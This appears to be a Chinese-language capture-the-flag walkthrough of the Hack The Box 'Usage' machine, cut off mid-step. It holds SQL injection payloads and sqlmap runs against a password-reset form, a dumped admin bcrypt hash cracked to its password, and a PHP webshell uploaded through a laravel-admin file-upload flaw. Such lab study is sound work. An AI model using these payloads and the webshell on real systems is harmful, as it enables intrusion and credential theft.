<img width="1354" height="369" alt="截屏2025-09-18 20 38 33" src="https://github.com/user-attachments/assets/535a012a-9eed-4c59-a564-e235d64ad5aa" />## Usage 没通过

### 500 是 HTTP 状态码，叫 500 Internal Server Error，表示服务器在处理请求时内部出错（代码崩溃、后端异常、资源耗尽等）
#### 其一什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
#### 其二第一阶段没造成大量 500，可以列出数据库（--dbs）
```
[*]$ nmap -sC -sV 10.129.146.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 04:46 CDT
Nmap scan report for 10.129.146.187
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[★]$ echo '10.192.146.187 usage.htb' | sudo tee -a /etc/hosts
10.192.146.187 usage.htb
```
#### 访问网站
![深邃的夜空有看不见的星星](images/091401.png)
#### 点击了Admin,输入了admin/admin:
![深邃的夜空有看不见的星星](images/091402.png)
#### 返回来，点击了Registe注册：
![深邃的夜空有看不见的星星](images/091403.png)
#### 梅开二度，再返回来，点击Reset Password ->输入注册时的邮箱
![深邃的夜空有看不见的星星](images/091404.png)
#### 输对了，还得继续输入邮箱，尝试一个无效的电子邮件显示：
![深邃的夜空有看不见的星星](images/091405.png)
```
test' or 1=1;-- -
```
#### 是典型的 SQL 注入 (SQL Injection) payload 示例。它的含义是：
```
![深邃的夜空有看不见的星星](images/091406.png)
test'：提前闭合了原本的字符串。
or 1=1：构造了一个总是为真的条件。
;-- -：; 结束原来的 SQL 语句，-- - 是 SQL 中的注释符号，把后面的内容全部注释掉。
```
#### 例如，如果后台原来的查询语句是：
```
SELECT * FROM users WHERE username = 'test' AND password = '123';
```
#### 被你输入这个 payload 之后，拼接后会变成：
```
SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
```
#### 因为 OR 1=1 永远为真，这样可能导致数据库返回所有用户的信息。
### [1]burpsuite本地拦截
#### 在burpsuite复制的按键Ctrl+C
#### 粘贴到vi里面的按键Shift+Ctrl+V

#### 注册的是test@example.com
#### 拦截的是test@example.com'
#### 手动修改1.在reset.req去掉末尾的%27
#### 手动修改2.什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
#### 不用Send，send是了看是否500，复制就是了
```
[*]$ vi reset.req

POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://usage.htb/forget-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://usage.htb
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IjJNSVpZSTFCd3RuL3A2Y2dxMlBEZFE9PSIsInZhbHVlIjoiT2lkUDdxZHZWQVdBRm1wL0hRUEd2WGZOdjRPeUpWYTd2aXlMTkU4RURhTndMYXRZRnhKeUpjTVJSRUtSeUFkT0ZnNkQ2K2JvY3pUMDhKZGNXWVdBVkNSaGR3S05CdFV1a2tUeWdrVEw5a3RaMEx6U1ZEc0VjS0VLcXVUZ3d6Y1AiLCJtYWMiOiIzYWY4ZTQ1OWM5MDg2YTU3NzkyMmRiZmIyYzhhYmYxMjViMDhlOWU0MjBlMjM4NjFjMmJjYjEwMWRiMTkyMmY2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkN1eEQ4NDdvZFZMVnA5S2VMMFZSSkE9PSIsInZhbHVlIjoiZWZkbVRVNzVQbWFYczJBUzRJSmFrMlJTdlJOdUVsV3pOTVFRd3YxeFpDWmZteXFiOExCU2o1SzZxM2JkMTBXNjVZMEdYYnR1QXhheStMYkFtU3FjamZHL0tjU0l1dkZTUGVnUlJMVWtYV3VTbzZRb2JXMGF5eEpxQXc5OGx6S2giLCJtYWMiOiI1Zjk1YWI2MjkwNGZmM2M3NjcxZDIzMjBhZTA2NjU0OGU2ZTI1NzE0MDI2OTQyNzUwYmJmYmM3OTBjZWM4NjM3IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

_token=4fNDZKDZKiQxXE8DGsgGS2kqwIUIGyVrq8mFW5Pt&email=test%40example.com
```
#### sqlmap
```
[★]$ sqlmap -r reset.req -p email --batch

[03:33:22] [WARNING] POST parameter 'email' does not seem to be injectable
[03:33:22] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[03:33:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 25 times, 503 (Service Unavailable) - 5 times
[03:33:22] [WARNING] your sqlmap version is outdated
```
#### 会出现红色的[CRITICAL]
```
[★]$ sqlmap -r reset.req -p email --level 5 --risk 3 --technique=BEUST --batch --dbs --threads 10

[03:40:51] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[03:40:51] [INFO] checking if the injection point on POST parameter 'email' is a false positive
[03:40:51] [WARNING] false positive or unexploitable injection point detected
[03:40:51] [WARNING] POST parameter 'email' does not seem to be injectable
[03:40:51] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[03:40:51] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 493 times, 503 (Service Unavailable) - 127 times
[03:40:51] [WARNING] your sqlmap version is outdated
```
### [2]重新再跑一次的步骤 
#### 1.清理
```
[★]$ find ~ | grep sqlmap
/home/syareya55/.local/share/sqlmap
/home/syareya55/.local/share/sqlmap/output
/home/syareya55/.local/share/sqlmap/output/usage.htb
/home/syareya55/.local/share/sqlmap/output/usage.htb/log
/home/syareya55/.local/share/sqlmap/output/usage.htb/target.txt
/home/syareya55/.local/share/sqlmap/history
[★]$ rm -fr /home/syareya55/.local/share/sqlmap
```
#### 2.更新 CSRF token / Cookie 即再burpsuite拦截一次
#### 3.sqlmap (命令来自ChatGPT,使用官方文档和官方视频的命令不成功)
```
[*]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=1 --delay=1 \
      --timeout=15 --retries=2 --drop-set-cookie --flush-session -v 3
//说明：串行、慢速、忽略服务端下发的 cookie，-v 3 看 payload /响应细节

<SNIP>
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
[03:56:52] [DEBUG] used the default behavior, running in batch mode
sqlmap identified the following injection point(s) with a total of 450 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=4fNDZKDZKiQxXE8DGsgGS2kqwIUIGyVrq8mFW5Pt&email=test@example.com' AND 4714=(SELECT (CASE WHEN (4714=4714) THEN 4714 ELSE (SELECT 1385 UNION SELECT 2719) END))-- csEK
    Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=4fNDZKDZKiQxXE8DGsgGS2kqwIUIGyVrq8mFW5Pt&email=test@example.com' AND 3468=BENCHMARK(5000000,MD5(0x79784e4f))-- pCWv
    Vector: AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])
---
[03:56:52] [INFO] the back-end DBMS is MySQL
[03:56:52] [PAYLOAD] test@example.com' AND 3748=(SELECT (CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 3748 ELSE (SELECT 5444 UNION SELECT 8871) END))-- -
```
#### sqlmap 已经成功识别出 email 为可注入点（布尔盲注 + 时间盲注），并且后台是 MySQL
#### 第一阶段没造成大量 500，可以列出数据库（--dbs）
```
[★]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=1 --delay=1  --drop-set-cookie --flush-session -v 3 --dbs

<SNIP>
[04:19:31] [INFO] retrieved: usage_blog
[04:19:31] [DEBUG] performed 67 queries in 73.35 seconds
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
````
#### 等待的时间大于7分钟
#### 列出 usage_blog 下的表（保守模式）目的：低并发、慢速列出表，减少 500/503。
```
[★]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=10 --drop-set-cookie -D usage_blog --tables
<SNIP>
Database: usage_blog
[15 tables]
+------------------------+
| aaaaa_iala?us?rs       |
| admin_user[oeqmiqqia?s |
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_roles            |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
<SNIP>
```
#### 这个命令很快
### [3]再重新再跑一次的步骤 
#### 1.清理
#### 2.更新 CSRF token / Cookie 即再burpsuite拦截一次
```
[★]$ sqlmap -r reset2.req -p email --batch --level=3 --risk=2  --drop-set-cookie -D usage_blog -T admin_users --dump

[11:36:54] [INFO] retrieved: admin
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```
#### 我们获得Administrator用户的哈希值，将其保存到一个名为hash的文件中，并将其提供给哈希破解工具john：
```
[★]$ vi hash
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ john hash --wordlist=rockyou.txt
Created directory: /home/syareya55/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:09 DONE (2025-09-17 11:47) 0.1103g/s 178.8p/s 178.8c/s 178.8C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
#### 密码为whatever1 
### 访问admin.usage.htb,用户/密码：admin/whatever1

#### 在仪表板的Environment部分，我们看到正在使用Laravel 10.18.0和PHP 8.1.2。在在撰写本文时，这两个版本都没有公开的重大漏洞。然而，在Dependencies选项卡的右边，我们看到一些库和包在使用。值得注意的是，该网站使用了encore/laravel-admin 1.8.18，这似乎很容易受到攻击。
![918空鸣918台风918忌日](images/091806.png)
https://nvd.nist.gov/vuln/detail/CVE-2023-24249
#### laravel-admin v1.8.19 中的任意文件上传漏洞允许攻击者通过精心设计的 PHP 文件执行任意代码。
https://flyd.uk/post/cve-2023-24249/
#### larravel-admin存在问题，允许攻击者绕过文件上传限制，攻击者可以上传*.php格式的文件进行远程代码执行
https://github.com/IDUZZEL/CVE-2023-24249-Exploit
#### 为了学习，我们将手动利用这个向量
```
攻击的工作流程如下：
1. 上传一个PHP webshell为.jpg文件。
2. 拦截请求并将扩展名设置为.jpg.php。
3. 直接访问上传的文件，执行PHP webshell。
```
#### 首先，我们通过点击右上角的用户图标下拉导航菜单：
![918空鸣918台风918忌日](images/091807.png)
#### 接下来，我们按下设置按钮，重定向到/admin/auth/Setting
#### 在这里，我们可以上传一个新的头像图像。我们在机器上创建一个简单的php.shell
```
[★]$ echo '<?php system($_GET["melo"]); ?>' > shell.php
[★]$ mv shell.php shell.jpg
```
![918空鸣918台风918忌日](images/091808.png)
#### 在按下Submit之前，我们打开BurpSuite代理来拦截上传请求。
![918空鸣918台风918忌日](images/091809.png)
#### Ctrl + R,Shift + Ctrl + R,只在shell.jpg后面加上.php，Send；之后让浏览器连接上网，再Forword；浏览器就有了：
![918空鸣918台风918忌日](images/091810.png)
#### 一旦我们转发请求，图像上传成功，我们可以复制链接到它所在的位置存储
#### 通过在新选项卡中打开该链接，我们可以通过附加？甜瓜={命令}到URL。例如，要运行id命令，我们访问：
